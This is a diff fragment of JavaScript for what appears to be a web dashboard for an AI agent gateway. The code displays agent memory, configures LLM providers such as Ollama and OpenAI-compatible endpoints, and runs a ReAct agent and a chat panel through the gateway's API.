+      return;
+    }
+    el.innerHTML = d.entries.map(e => {
+      const score = e.score !== undefined ? `<span class="mem-score">${(e.score * 100).toFixed(0)}%</span>` : '';
+      const tags = (e.metadata.tags || []).map(t => `<span class="mem-tag">${t}</span>`).join('');
+      return `<div class="mem-entry">
+        <div>${e.content.slice(0, 150)}${e.content.length > 150 ? '…' : ''}${score}</div>
+        <div style="margin-top:2px;">${tags}<span style="float:right;color:var(--text2);font-size:10px;">accessed×${e.accessCount}</span></div>
+      </div>`;
+    }).join('');
+  } catch(e) {
+    el.innerHTML = `<div style="color:var(--red);">Error: ${e}</div>`;
+  }
+}
+
+async function clearWorkingMemory() {
+  if (!confirm('Clear L1 working memory?')) return;
+  await fetch(`${GATEWAY}/api/memory/clear`, {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ tier: 'working' }),
+  });
+  await loadMemoryStats();
+  await loadRecentMemories();
+}
+
+// ── 初始化 ────────────────────────────────────────────────────────────────
+checkLLMConfig();
+checkHealth();
+loadTasks();
+loadAudit();
+loadMemoryStats();
+loadRecentMemories();
+setInterval(loadAudit, 8000);
+setInterval(loadTasks, 10000);
+setInterval(checkHealth, 15000);
+setInterval(loadMemoryStats, 20000);
+setInterval(loadRecentMemories, 20000);
+
+// Enter 键不提交（代码编辑器保留换行）
+document.getElementById('code-editor').addEventListener('keydown', e => {
+  if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) {
+    e.preventDefault();
+    runCode();
+  }
+});
+
+// ── EP-07 LLM Planner ────────────────────────────────────────────────────────
+
+const PRESETS = {
+  ollama:     { baseUrl: 'http://localhost:11434/v1', model: 'llama3.2' },
+  openai:     { baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini' },
+  openrouter: { baseUrl: 'https://openrouter.ai/api/v1', model: 'openai/gpt-4o-mini' },
+  deepseek:   { baseUrl: 'https://api.deepseek.com/v1', model: 'deepseek-chat' },
+};
+
+function applyPreset() {
+  const p = PRESETS[document.getElementById('llm-preset').value];
+  if (!p) return;
+  document.getElementById('llm-base-url').value = p.baseUrl;
+  document.getElementById('llm-model').value = p.model;
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+async function configureLLM() {
+  const baseUrl = document.getElementById('llm-base-url').value.trim();
+  const model   = document.getElementById('llm-model').value.trim();
+  const apiKey  = document.getElementById('llm-api-key').value.trim();
+  const el      = document.getElementById('llm-config-result');
+  if (!baseUrl || !model) { el.innerHTML = '<span style="color:var(--red);">baseUrl and model are required</span>'; return; }
+  el.innerHTML = '<span style="color:var(--text2);">Configuring...</span>';
+  try {
+    const res = await fetch(`${GATEWAY}/api/llm/configure`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ baseUrl, model, apiKey: apiKey || undefined, type: 'custom' }),
+    });
+    const d = await res.json();
+    if (d.ok) {
+      el.innerHTML = `<span style="color:var(--green);">✓ Configured: ${d.config?.model}</span>`;
+      document.getElementById('llm-status-badge').className = 'tag ok';
+      document.getElementById('llm-status-badge').textContent = 'Configured';
+    } else {
+      el.innerHTML = `<span style="color:var(--red);">✗ ${d.error}</span>`;
+    }
+  } catch(e) { el.innerHTML = `<span style="color:var(--red);">✗ ${e.message}</span>`; }
+}
+
+async function pingLLM() {
+  const el = document.getElementById('llm-config-result');
+  el.innerHTML = '<span style="color:var(--text2);">⏳ Pinging...</span>';
+  try {
+    const res = await fetch(`${GATEWAY}/api/llm/ping`, { method: 'POST' });
+    const d = await res.json();
+    if (d.ok) {
+      el.innerHTML = `<span style="color:var(--green);">✓ ${d.model} — ${d.latencyMs}ms</span>`;
+      document.getElementById('llm-status-badge').className = 'tag ok';
+      document.getElementById('llm-status-badge').textContent = `Online · ${d.latencyMs}ms`;
+    } else {
+      el.innerHTML = `<span style="color:var(--red);">✗ ${d.error}</span>`;
+      document.getElementById('llm-status-badge').className = 'tag fail';
+      document.getElementById('llm-status-badge').textContent = 'Offline';
+    }
+  } catch(e) { el.innerHTML = `<span style="color:var(--red);">✗ ${e.message}</span>`; }
+}
+
+function clearLLMOutput() {
+  document.getElementById('llm-output').innerHTML = '<div style="color:var(--text2);">LLM output will appear here...</div>';
+  llmChatMessages = [];
+}
+
+function renderStep(step) {
+  const isFinal = step.isFinal;
+  const col = isFinal ? 'var(--green)' : 'var(--accent)';
+  let h = `<div style="margin-bottom:10px;padding:8px;background:var(--bg2);border-radius:4px;border-left:3px solid ${col}">`;
+  h += `<div style="font-size:10px;color:var(--text2);margin-bottom:4px;">STEP ${step.stepIndex}${isFinal?' ✓ FINAL':''}</div>`;
+  if (step.thought)      h += `<div style="color:var(--text2);margin-bottom:4px;">💭 <em>${escHtml(step.thought)}</em></div>`;
+  if (step.action)       h += `<div style="color:var(--yellow);margin-bottom:4px;">⚡ <b>${escHtml(step.action.tool)}</b>(${escHtml(JSON.stringify(step.action.params).slice(0,120))})</div>`;
+  if (step.observation)  h += `<div style="color:var(--green);font-size:11px;margin-bottom:4px;">👁 ${escHtml(step.observation.slice(0,300))}</div>`;
+  if (step.answer)       h += `<div style="color:var(--text);font-weight:600;border-top:1px solid var(--border);padding-top:6px;margin-top:6px;">✅ ${escHtml(step.answer)}</div>`;
+  h += '</div>';
+  return h;
+}
+
+async function runLLMAgent() {
+  const task = document.getElementById('llm-task-input').value.trim();
+  if (!task) return;
+  const out = document.getElementById('llm-output');
+  const btn = document.getElementById('llm-run-btn');
+  out.innerHTML = '<div style="color:var(--text2);"><span class="spinning">⟳</span> Running LLM Agent (ReAct)...</div>';
+  btn.disabled = true;
+  const t0 = Date.now();
+  try {
+    const res = await fetch(`${GATEWAY}/api/llm/run`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ task }),
+    });
+    const d = await res.json();
+    const dur = Date.now() - t0;
+    let html = `<div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
+      <span class="tag ${d.ok?'ok':'fail'}">${d.ok?'✓ OK':'✗ FAIL'}</span>
+      <span class="tag info">🤖 ${escHtml(d.model??'llm')}</span>
+      <span class="tag info">${(d.steps||[]).length} steps</span>
+      <span class="tag info">${dur}ms</span>
+    </div>`;
+    if (d.steps?.length) {
+      html += '<div style="color:var(--text2);font-size:10px;margin-bottom:6px;text-transform:uppercase;">ReAct Steps</div>';
+      html += d.steps.map(renderStep).join('');
+    }
+    if (d.error) html += `<div style="color:var(--red);margin-top:8px;">Error: ${escHtml(d.error)}</div>`;
+    out.innerHTML = html;
+  } catch(e) {
+    out.innerHTML = `<div style="color:var(--red);">✗ ${escHtml(e.message)}</div>`;
+  } finally { btn.disabled = false; }
+}
+
+let llmChatMessages = [];
+
+function runLLMChat() {
+  const area = document.getElementById('llm-chat-area');
+  area.style.display = area.style.display === 'none' ? 'block' : 'none';
+}
+
+async function sendChat() {
+  const input = document.getElementById('llm-chat-input');
+  const msg = input.value.trim();
+  if (!msg) return;
+  llmChatMessages.push({ role: 'user', content: msg });
+  input.value = '';
+  const out = document.getElementById('llm-output');
+  out.innerHTML = '<div style="color:var(--text2);"><span class="spinning">⟳</span> Chatting...</div>';
+  try {
+    const res = await fetch(`${GATEWAY}/api/llm/chat`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ messages: llmChatMessages }),
+    });
+    const d = await res.json();
+    if (d.ok && d.message) {
+      llmChatMessages.push(d.message);
+      let html = '';
+      for (const m of llmChatMessages) {
+        const isUser = m.role === 'user';
+        html += `<div style="margin-bottom:8px;padding:6px 10px;border-radius:4px;background:${isUser?'rgba(88,166,255,0.1)':'var(--bg2)'};border-left:3px solid ${isUser?'var(--accent)':'var(--green)'}">
+          <div style="font-size:10px;color:var(--text2);margin-bottom:4px;">${isUser?'👤 USER':'🤖 ASSISTANT'}</div>
+          <div style="white-space:pre-wrap;font-size:12px;">${escHtml(m.content??'')}</div>
+        </div>`;
+      }
+      html += `<div style="color:var(--text2);font-size:10px;margin-top:4px;">${d.usage?.total_tokens??'?'} tokens | ${d.durationMs}ms</div>`;
+      out.innerHTML = html;
+    } else {
+      out.innerHTML = `<div style="color:var(--red);">✗ ${escHtml(d.error??'Unknown error')}</div>`;
+    }
+  } catch(e) { out.innerHTML = `<div style="color:var(--red);">✗ ${escHtml(e.message)}</div>`; }
+}
+
+async function checkLLMConfig() {
+  try {
+    const res = await fetch(`${GATEWAY}/api/llm/config`);
+    const d = await res.json();
+    if (d.configured && d.config) {
+      document.getElementById('llm-status-badge').className = 'tag ok';
+      document.getElementById('llm-status-badge').textContent = `Configured · ${d.config.model}`;
+      document.getElementById('llm-base-url').value = d.config.baseUrl ?? '';
+      document.getElementById('llm-model').value = d.config.model ?? '';
+    }
+  } catch(_) {}
+}
+</script>
+</body>
+</html>
